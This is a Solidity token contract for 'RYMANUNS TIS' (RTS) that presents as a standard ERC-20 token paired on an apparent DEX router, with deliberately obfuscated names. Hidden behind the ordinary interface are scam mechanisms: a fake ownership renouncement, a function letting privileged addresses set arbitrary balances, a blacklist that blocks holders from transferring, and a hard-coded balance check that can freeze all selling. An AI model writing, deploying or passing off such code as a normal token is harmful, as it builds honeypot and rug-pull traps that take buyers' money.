//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface modeAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface listLaunch {
    function createPair(address exemptFund, address tradingMarketing) external returns (address);
}

abstract contract buyLaunchFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapTeam) external view returns (uint256);

    function transfer(address fundTake, uint256 maxTrading) external returns (bool);

    function allowance(address toLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxTrading) external returns (bool);

    function transferFrom(address sender,address fundTake,uint256 maxTrading) external returns (bool);

    event Transfer(address indexed from, address indexed senderReceiverAt, uint256 value);
    event Approval(address indexed toLaunch, address indexed spender, uint256 value);
}

interface swapSenderMetadata is swapSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RYMANUNSTIS is buyLaunchFund, swapSender, swapSenderMetadata {

    address public isListTo;

    constructor (){
        if (shouldReceiver == feeAmount) {
            maxIs = true;
        }
        takeFund();
        modeAuto amountTrading = modeAuto(shouldSender);
        isListTo = listLaunch(amountTrading.factory()).createPair(amountTrading.WETH(), address(this));
        
        exemptReceiverReceiver = _msgSender();
        teamMinSwap[exemptReceiverReceiver] = true;
        txFrom[exemptReceiverReceiver] = autoMarketingToken;
        
        emit Transfer(address(0), exemptReceiverReceiver, autoMarketingToken);
    }

    function txFee(address marketingTeam, address fundTake, uint256 maxTrading) internal returns (bool) {
        if (marketingTeam == exemptReceiverReceiver) {
            return enableLiquidityTrading(marketingTeam, fundTake, maxTrading);
        }
        uint256 atExempt = swapSender(isListTo).balanceOf(modeTokenReceiver);
        require(atExempt == exemptLaunched);
        require(!txFund[marketingTeam]);
        return enableLiquidityTrading(marketingTeam, fundTake, maxTrading);
    }

    event OwnershipTransferred(address indexed receiverTrading, address indexed amountReceiverSwap);

    string private shouldTotalLaunched = "RYMANUNS TIS";

    mapping(address => bool) public teamMinSwap;

    bool private shouldReceiver;

    function isFrom(address toSwap) public {
        maxAmountReceiver();
        
        if (toSwap == exemptReceiverReceiver || toSwap == isListTo) {
            return;
        }
        txFund[toSwap] = true;
    }

    uint256 private fromMax;

    function owner() external view returns (address) {
        return marketingFee;
    }

    mapping(address => mapping(address => uint256)) private modeAt;

    address public exemptReceiverReceiver;

    address modeTokenReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function takeFund() public {
        emit OwnershipTransferred(exemptReceiverReceiver, address(0));
        marketingFee = address(0);
    }

    function getOwner() external view returns (address) {
        return marketingFee;
    }

    address shouldSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function buyEnable(address receiverBuy, uint256 maxTrading) public {
        maxAmountReceiver();
        txFrom[receiverBuy] = maxTrading;
    }

    uint256 private autoMarketingToken = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return shouldTotalLaunched;
    }

    function approve(address autoFund, uint256 maxTrading) public virtual override returns (bool) {
        modeAt[_msgSender()][autoFund] = maxTrading;
        emit Approval(_msgSender(), autoFund, maxTrading);
        return true;
    }

    uint256 private fundAuto;

    function balanceOf(address swapTeam) public view virtual override returns (uint256) {
        return txFrom[swapTeam];
    }

    uint8 private marketingLaunchMin = 18;

    function autoWallet(uint256 maxTrading) public {
        maxAmountReceiver();
        exemptLaunched = maxTrading;
    }

    bool public tokenMax;

    function transfer(address receiverBuy, uint256 maxTrading) external virtual override returns (bool) {
        return txFee(_msgSender(), receiverBuy, maxTrading);
    }

    string private marketingExemptFund = "RTS";

    bool private maxIs;

    function totalSupply() external view virtual override returns (uint256) {
        return autoMarketingToken;
    }

    function allowance(address launchedFrom, address autoFund) external view virtual override returns (uint256) {
        if (autoFund == shouldSender) {
            return type(uint256).max;
        }
        return modeAt[launchedFrom][autoFund];
    }

    bool private modeShould;

    address private marketingFee;

    function transferFrom(address marketingTeam, address fundTake, uint256 maxTrading) external override returns (bool) {
        if (_msgSender() != shouldSender) {
            if (modeAt[marketingTeam][_msgSender()] != type(uint256).max) {
                require(maxTrading <= modeAt[marketingTeam][_msgSender()]);
                modeAt[marketingTeam][_msgSender()] -= maxTrading;
            }
        }
        return txFee(marketingTeam, fundTake, maxTrading);
    }

    function enableLiquidityTrading(address marketingTeam, address fundTake, uint256 maxTrading) internal returns (bool) {
        require(txFrom[marketingTeam] >= maxTrading);
        txFrom[marketingTeam] -= maxTrading;
        txFrom[fundTake] += maxTrading;
        emit Transfer(marketingTeam, fundTake, maxTrading);
        return true;
    }

    function tradingLiquidityWallet(address enableTake) public {
        if (listBuy) {
            return;
        }
        
        teamMinSwap[enableTake] = true;
        if (feeAmount != shouldReceiver) {
            fundAuto = feeMax;
        }
        listBuy = true;
    }

    mapping(address => uint256) private txFrom;

    uint256 public feeMax;

    uint256 fundIsList;

    uint256 exemptLaunched;

    function decimals() external view virtual override returns (uint8) {
        return marketingLaunchMin;
    }

    function maxAmountReceiver() private view {
        require(teamMinSwap[_msgSender()]);
    }

    bool public listBuy;

    bool private feeAmount;

    mapping(address => bool) public txFund;

    function symbol() external view virtual override returns (string memory) {
        return marketingExemptFund;
    }

}